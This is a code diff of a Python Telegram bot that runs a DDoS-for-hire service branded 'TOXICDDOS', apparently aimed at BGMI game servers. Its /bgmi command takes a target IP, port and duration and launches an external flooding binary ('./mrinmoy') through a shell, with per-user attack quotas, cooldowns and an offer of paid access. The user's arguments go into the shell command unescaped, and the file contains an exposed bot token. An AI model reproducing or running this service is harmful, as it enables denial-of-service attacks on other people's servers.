@@ -10,7 +10,7 @@ logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s
 # Telegram bot token and channel ID
 TOKEN = '7885504979:AAGwRrIWAZNxcd1apzEJKN_X1oUgqqKQ0LI'  # Replace with your actual bot token
 ADMIN_IDS = [6882674372]  # Added new admin ID
-CHANNEL_ID = '-1002431196846' # Replace with your specific channel or group ID
+CHANNEL_ID = '-1002431196846'  # Replace with your specific channel or group ID
 # Initialize the bot
 bot = telebot.TeleBot(TOKEN)
 
@@ -22,7 +22,7 @@ user_bans = {}  # Tracks user ban status and ban expiry time
 reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=10))).replace(hour=0, minute=0, second=0, microsecond=0)
 
 # Cooldown duration (in seconds)
-COOLDOWN_DURATION = 10  # 5 minutes
+COOLDOWN_DURATION = 60  # 5 minutes
 BAN_DURATION = timedelta(minutes=1)  
 DAILY_ATTACK_LIMIT = 15  # Daily attack limit per user
 
@@ -30,8 +30,8 @@ DAILY_ATTACK_LIMIT = 15  # Daily attack limit per user
 EXEMPTED_USERS = [5047224084, 1604629264]
 
 # Track active attacks
-active_attacks = 0  
-MAX_ACTIVE_ATTACKS = 2  # Maximum number of running attacks
+active_attacks = 0
+MAX_ACTIVE_ATTACKS = 1  # Maximum number of running attacks
 
 def reset_daily_counts():
     """Reset the daily attack counts and other data at 12 AM IST."""
@@ -58,45 +58,7 @@ def is_valid_port(port):
 def is_valid_duration(duration):
     return duration.isdigit() and int(duration) > 0
 
-# /start Command 
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    bot.send_message(
-        message.chat.id,
-        "✨🔥 *『 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 TOXICDDOS™ 』* 🔥✨\n\n"
-        "🚀 *Hello, Commander!* ⚡\n"
-        "🎯 *Get ready to dominate the battlefield!* 🏆\n\n"
-        "💀 *𝙏𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙨 𝙙𝙚𝙨𝙞𝙜𝙣𝙚𝙙 𝙩𝙤 𝙝𝙚𝙡𝙥 𝙮𝙤𝙪 𝙖𝙩𝙩𝙖𝙘𝙠 & 𝙙𝙚𝙛𝙚𝙣𝙙!* 💀\n\n"
-        "⚡ *Use* `/help` *to explore all commands!* 📜"
-    )
-
-# /help Command - Stylish Help Menu
-@bot.message_handler(commands=['help'])
-def show_help(message):
-    response = (
-        "╔══════════════════════════╗\n"
-        "       🌟 *『 TOXICDDOS™ 𝐇𝐄𝐋𝐏 𝐌𝐄𝐍𝐔 』* 🌟\n"
-        "╚══════════════════════════╝\n\n"
-        "💀 *𝙏𝙃𝙀 𝘽𝙀𝙎𝙏 𝘽𝙊𝙏 𝙁𝙊𝙍 𝘿𝙊𝙈𝙄𝙉𝘼𝙏𝙄𝙊𝙉!* 💀\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "🚀 *『 𝗨𝗦𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 』* 🚀\n"
-        "🎮 `/start` - ✨ *Begin your journey!*\n"
-        "📜 `/help` - 🏆 *View this epic menu!*\n"
-        "⚡ `/status` - 🚀 *Check your battle status!*\n"
-        "✅ `/verify` - 🔓 *Unlock exclusive features!*\n"
-        "💀 `/bgmi` - 🎯 *Launch your attack!* *(Verified users only)*\n"
-        "📸 *Send a Photo* - 🔥 *Submit feedback!* \n\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "💠 *『 𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 』* 💠\n"
-        "🔄 `/reset_TP` - ⚙️ *Reset attack limits!*\n\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "🔗 *𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬:* [⚡ TOXICPLAYER002](https://t.me/TOXICPLAYER002) 💀\n"
-    )
-
-    response = bot.reply_to(message, response, parse_mode="Markdown", disable_web_page_preview=True)
-
-
-# PAPA bgmi_FLASH92
+# PAPA TF_FLASH92
 # 🛡️ 『 𝑺𝒕𝒂𝒕𝒖𝒔 𝑪𝒐𝒎𝒎𝒂𝒏𝒅 』🛡️
 @bot.message_handler(commands=['status'])
 def check_status(message):
@@ -118,7 +80,7 @@ def check_status(message):
 
 
 # 🔄 『 𝑹𝒆𝒔𝒆𝒕 𝑨𝒕𝒕𝒂𝒄𝒌 𝑳𝒊𝒎𝒊𝒕𝒔 』🔄
-@bot.message_handler(commands=['reset_TP'])
+@bot.message_handler(commands=['reset_TF'])
 def reset_attack_limit(message):
     owner_id = 6882674372  # Replace with the actual owner ID
     if message.from_user.id != owner_id:
@@ -140,7 +102,7 @@ def reset_attack_limit(message):
         "🚀 *𝗨𝘀𝗲𝗿𝘀 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘀𝘁𝗮𝗿𝘁 𝗻𝗲𝘄 𝗮𝘁𝘁𝗮𝗰𝗸𝘀!* 🚀\n"
         "💀 *𝗣𝗿𝗲𝗽𝗮𝗿𝗲 𝗳𝗼𝗿 𝗗𝗢𝗠𝗜𝗡𝗔𝗧𝗜𝗢𝗡!* 💀\n"
         "━━━━━━━━━━━━━━━━━━━\n"
-        "🔗 *𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬: [TOXICPLAYER002](https://t.me/TOXICPLAYER002) ⚡*"
+        "🔗 *𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬: [TOXICPLAYER](https://t.me/TOXICPLAYER002) ⚡*"
     )
 
     response = bot.reply_to(message, response, parse_mode="Markdown", disable_web_page_preview=True)
@@ -210,81 +172,15 @@ def handle_photo(message):
     bot.send_message(FEEDBACK_CHANNEL_ID, channel_response)
 
 
-# Store verified users
-verified_users = set()
-
-# Private channel username (not ID)
-PRIVATE_CHANNEL_USERNAME = "APNA_BHAI_DILDOS"  # Example: "MyPrivateChannel"
-PRIVATE_CHANNEL_LINK = "https://t.me/APNA_BHAI_DILDOS"  # Replace with actual link
-
-# ✅ Command to verify after joining
-@bot.message_handler(commands=['verify'])
-def verify_user(message):
-    user_id = message.from_user.id
-    
-    try:
-        chat_member = bot.get_chat_member(f"@{PRIVATE_CHANNEL_USERNAME}", user_id)
-        if chat_member.status in ["member", "administrator", "creator"]:
-            verified_users.add(user_id)
-            bot.send_message(
-                message.chat.id,
-                "✅✨ *𝗩𝗘𝗥𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟!* ✨✅\n\n"
-                "🎉 𝗪𝗲𝗹𝗰𝗼𝗺𝗲! 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘄 𝗮 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱 𝗨𝘀𝗲𝗿. 🚀\n"
-                "🔗 𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝗮𝗰𝗰𝗲𝘀𝘀 /bgmi 𝘀𝗲𝗿𝘃𝗶𝗰𝗲𝘀! ⚡️"
-            )
-        else:
-            bot.send_message(
-                message.chat.id,
-                f"🚨 *𝗩𝗘𝗥𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 𝗙𝗔𝗜𝗟𝗘𝗗!* 🚨\n\n"
-                f"🔗 [Join our Channel]({PRIVATE_CHANNEL_LINK}) 📩\n"
-                "⚠️ 𝗔𝗳𝘁𝗲𝗿 𝗷𝗼𝗶𝗻𝗶𝗻𝗴, 𝗿𝘂𝗻 /verify 𝗮𝗴𝗮𝗶𝗻.",
-                parse_mode="Markdown"
-            )
-    except Exception:
-        bot.send_message(
-            message.chat.id,
-            f"⚠️ *𝗘𝗿𝗿𝗼𝗿 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗠𝗲𝗺𝗯𝗲𝗿𝘀𝗵𝗶𝗽!* ⚠️\n\n"
-            f"📌 𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘆𝗼𝘂 𝗵𝗮𝘃𝗲 𝗷𝗼𝗶𝗻𝗲𝗱: [Click Here]({PRIVATE_CHANNEL_LINK})",
-            parse_mode="Markdown"
-        )
-
-
-# ⚠️ Modify /bgmi to check live membership
 @bot.message_handler(commands=['bgmi'])
 def bgmi_command(message):
+    global user_attacks, user_cooldowns, user_photos, user_bans
     user_id = message.from_user.id
-
-    try:
-        chat_member = bot.get_chat_member(f"@{PRIVATE_CHANNEL_USERNAME}", user_id)
-        if chat_member.status not in ["member", "administrator", "creator"]:
-            verified_users.discard(user_id)
-            bot.send_message(
-                message.chat.id,
-                f"🚨 *𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗!* 🚨\n\n"
-                f"🔗 [Click Here to Rejoin]({PRIVATE_CHANNEL_LINK})\n"
-                "📌 𝗧𝗵𝗲𝗻 𝗿𝘂𝗻 /verify 𝗮𝗴𝗮𝗶𝗻 𝘁𝗼 𝗿𝗲𝗴𝗮𝗶𝗻 𝗮𝗰𝗰𝗲𝘀𝘀!",
-                parse_mode="Markdown"
-            )
-            return
-    except Exception:
-        bot.send_message(
-            message.chat.id,
-            f"⚠️ *𝗘𝗿𝗿𝗼𝗿 𝗩𝗲𝗿𝗶𝗳𝘆𝗶𝗻𝗴 𝗬𝗼𝘂!* ⚠️\n\n"
-            f"📌 𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘆𝗼𝘂 𝗵𝗮𝘃𝗲 𝗷𝗼𝗶𝗻𝗲𝗱: [Click Here]({PRIVATE_CHANNEL_LINK})",
-            parse_mode="Markdown"
-        )
-        return
-
-    bot.send_message(
-        message.chat.id,
-        "✅ *𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!* 🎉\n"
-        "🚀 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗮 𝗽𝗮𝗿𝘁 𝗼𝗳 𝘁𝗵𝗲 𝗲𝗹𝗶𝘁𝗲! 𝗘𝘅𝗲𝗰𝘂𝘁𝗶𝗻𝗴 /bgmi... 🔥"
-    )
-
+    user_name = message.from_user.first_name or "Unknown"
 
     # Ensure the bot only works in the specified channel or group
     if str(message.chat.id) != CHANNEL_ID:
-        bot.send_message(message.chat.id, " ⚠️⚠️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 ⚠️⚠️ \n\n[ 𝗕𝗢𝗧 𝗠𝗔𝗗𝗘 𝗕𝗬 : @TOXICPLAYER002 ( TUMHARE_PAPA ) | ]\n\nPAID AVAILABLE DM:- @TOXICPLAYER002")
+        bot.send_message(message.chat.id, " ⚠️⚠️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 ⚠️⚠️ \n\n[ 𝗕𝗢𝗧 𝗠𝗔𝗗𝗘 𝗕𝗬 : @TOXICPLAYER002 ( TUMHARE_PAPA ) | ]")
         return
 
     # Reset counts daily
@@ -298,13 +194,13 @@ def bgmi_command(message):
             minutes, seconds = divmod(remaining_ban_time, 10)
             bot.send_message(
                 message.chat.id,
-                f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙤𝙧 𝙣𝙤𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙞𝙣g 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠. Please  𝙬𝙖𝙞𝙩 {int(minutes)} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {int(seconds)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 !  ⚠️⚠️"
+                f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙤𝙧 𝙣𝙤𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙞𝙣𝙜 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {int(minutes)} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {int(seconds)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 !  ⚠️⚠️"
             )
             return
         else:
             del user_bans[user_id]  # Remove ban after expiry
 
-# Check if the number of running attacks is at the limit
+    # Check if the number of running attacks is at the limit
     if active_attacks >= MAX_ACTIVE_ATTACKS:
         bot.send_message(
             message.chat.id,
@@ -332,7 +228,7 @@ def bgmi_command(message):
         if user_attacks[user_id] >= DAILY_ATTACK_LIMIT:
             bot.send_message(
                 message.chat.id,
-                f"𝙃𝙞 {message.from_user.first_name}, BHAI APKI AJ KI ATTACK LIMIT HOGYI HAI AB DIRECT KAL ANA  ✌️"
+                f"𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙝𝙖𝙫𝙚 𝙧𝙚𝙖𝙘𝙝𝙚𝙙 𝙩𝙝𝙚 𝙢𝙖𝙭𝙞𝙢𝙪𝙢 𝙣𝙪𝙢𝙗𝙚𝙧 𝙤𝙛 𝙖𝙩𝙩𝙖𝙘𝙠-𝙡𝙞𝙢𝙞𝙩 𝙛𝙤𝙧 𝙩𝙤𝙙𝙖𝙮, 𝘾𝙤𝙢𝙚𝘽𝙖𝙘𝙠 𝙏𝙤𝙢𝙤𝙧𝙧𝙤𝙬 ✌️"
             )
             return
 
@@ -341,7 +237,7 @@ def bgmi_command(message):
             user_bans[user_id] = datetime.now() + BAN_DURATION  # Ban user for 2 hours
             bot.send_message(
                 message.chat.id,
-                f"𝙃𝙞 {message.from_user.first_name}, ⚠️💀 DEKH BHAI TU NE FEEDBACK NHI DIYA ISLIYE.\n\n 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙧𝙤𝙢 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 10 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 ⚠️⚠️"
+                f"𝙃𝙞 {message.from_user.first_name}, ⚠️⚠️𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙖𝙛𝙩𝙚𝙧 𝙮𝙤𝙪𝙧 𝙡𝙖𝙨𝙩 𝙖𝙩𝙩𝙖𝙘𝙠. 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙧𝙤𝙢 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 10 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 ⚠️⚠️"
             )
             return
 
@@ -351,7 +247,7 @@ def bgmi_command(message):
         logging.info(f"Received arguments: {args}")
 
         if len(args) != 3:
-            raise ValueError("TOXIC 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n⚙ USE THIS 👇⬇️\n/bgmi <IP> <PORT> <DURATION>")
+            raise ValueError("TOXIC 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩 \n /𝗯𝗴𝗺𝗶 <𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽> <𝘁𝗮𝗿𝗴𝗲𝘁_𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
 
         target_ip, target_port, user_duration = args
 
@@ -381,11 +277,11 @@ def bgmi_command(message):
         username = user_info.username if user_info.username else user_info.first_name
         bot.send_message(
         message.chat.id,
-            f"🚀𝙃𝙞 {message.from_user.first_name}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣 {target_ip} : {target_port} 𝙛𝙤𝙧 {default_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 ] \n\n⚠️𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 𝘼𝙏𝙏𝘼𝘾𝙆𝙎 𝙁𝙊𝙍 𝙏𝙊𝘿𝘼𝙔⚠️ :- {remaining_attacks}\n\n★[𝔸𝕋𝕋𝔸ℂ𝕂𝔼ℝ 𝙉𝘼𝙈𝙀]★:- @{username}\n\n❗️❗️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 ❗️❗️"
+            f"🚀𝙃𝙞 {message.from_user.first_name}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣 {target_ip} : {target_port} 𝙛𝙤𝙧 {default_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 ] \n\n🖤𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 𝘼𝙏𝙏𝘼𝘾𝙆𝙎 𝙁𝙊𝙍 𝙏𝙊𝘿𝘼𝙔🖤 :- {remaining_attacks}\n\n★[𝔸𝕋𝕋𝔸ℂ𝕂𝔼ℝ 𝙉𝘼𝙈𝙀]★:- @{username}\n\n❗️❗️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 ❗️❗️"
         )
 
         # Log the attack started message
-        logging.info(f"Attack started by {user_name}: ./Moin {target_ip} {target_port} {default_duration} 900")
+        logging.info(f"Attack started by {user_name}: ./mrinmoy {target_ip} {target_port} {default_duration}")
 
         # Run the attack command with the default duration and pass the user-provided duration for the finish message
         asyncio.run(run_attack_command_async(target_ip, int(target_port), default_duration, user_duration, user_name))
@@ -395,10 +291,10 @@ def bgmi_command(message):
 
 async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
     try:
-        command = f"./mrinmoy {target_ip} {target_port} {duration}"
+        command = f" ./mrinmoy {target_ip} {target_port} {duration}"
         process = await asyncio.create_subprocess_shell(command)
         await process.communicate()
-        bot.send_message(CHANNEL_ID, f"🌊ѦƮṪ𝘼₡𝘒 ₡𝓞𝑀ℙLỄṪỄĎ🌊\n\n𝐓𝐀𝐑𝐆𝐄𝐓 -> {target_ip}\n𝐏𝐎𝐑𝐓 -> {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ \n[ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> TOXICDDOS")
+        bot.send_message(CHANNEL_ID, f"🌊ѦƮṪ𝘼₡𝘒 ₡𝓞𝑀ℙLỄṪỄĎ🌊\n\n𝐓𝐀𝐑𝐆𝐄𝐓 -> {target_ip}\n𝐏𝐎𝐑𝐓 -> {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ \n[ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝙏OXIC 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧")
     except Exception as e:
         bot.send_message(CHANNEL_ID, f"Error running attack command: {e}")
 
